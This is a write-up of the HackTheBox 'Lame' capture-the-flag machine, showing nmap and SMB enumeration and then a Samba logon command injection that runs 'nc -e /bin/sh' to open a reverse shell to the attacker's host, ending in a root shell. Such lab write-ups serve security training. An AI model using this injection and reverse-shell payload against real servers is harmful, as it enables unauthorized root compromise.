# HackTheBox: Lame

- Linux
- FTP
- Samba

## Nmap

```console
kali@kali:~/Desktop/repos/ctf/hack-the-box/lame$ nmap 10.10.10.3 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-27 00:38 BST
Nmap scan report for 10.10.10.3
Host is up (0.012s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

```console
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.36
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3d00h52m48s, deviation: 2h49m43s, median: -3d02h52m49s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-09-23T16:46:40-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.58 seconds

```

## FTP 

vsFTPd 2.3.4 has a backdoor that can be exploited. Will not exploit this.

```console
kali@kali:~/Desktop/repos/ctf/hack-the-box/lame$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kali): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
```

## SMB

SMB has a logon flag vulnerability for reverse shell.

```console
kali@kali:~/Desktop/repos/ctf/hack-the-box/lame$ smbmap -H 10.10.10.3
[+] IP: 10.10.10.3:445	Name: 10.10.10.3                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
```
```console
kali@kali:~/Desktop/repos/ctf/hack-the-box/lame$ smbmap -H 10.10.10.3 -R
[+] IP: 10.10.10.3:445	Name: 10.10.10.3                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	.\tmp\*
	dr--r--r--                0 Wed Sep 23 21:53:28 2020	.
	dw--w--w--                0 Sun May 20 19:36:11 2012	..
	fw--w--w--                0 Wed Sep 23 21:37:07 2020	5147.jsvc_up
	dr--r--r--                0 Wed Sep 23 21:36:04 2020	.ICE-unix
	dr--r--r--                0 Wed Sep 23 21:36:30 2020	.X11-unix
	fw--w--w--               11 Wed Sep 23 21:36:30 2020	.X0-lock
	.\tmp\.X11-unix\*
	dr--r--r--                0 Wed Sep 23 21:36:30 2020	.
	dr--r--r--                0 Wed Sep 23 21:53:28 2020	..
	fr--r--r--                0 Wed Sep 23 21:36:30 2020	X0
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
```

```console
kali@kali:~/Desktop/repos/ctf/hack-the-box/lame$ smbclient \\\\10.10.10.3\\tmp --option='client min protocol=NT1'
Enter WORKGROUP\kali's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
smb: \> logon "/=`nohup nc -nv 10.10.14.36 4444 -e /bin/sh`"
Password: 
```

```console
kali@kali:~/Desktop/repos/ctf/hack-the-box/lame$ nc -lvp 4444
listening on [any] 4444 ...
10.10.10.3: inverse host lookup failed: Unknown host
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.3] 44881
whoami
root
```

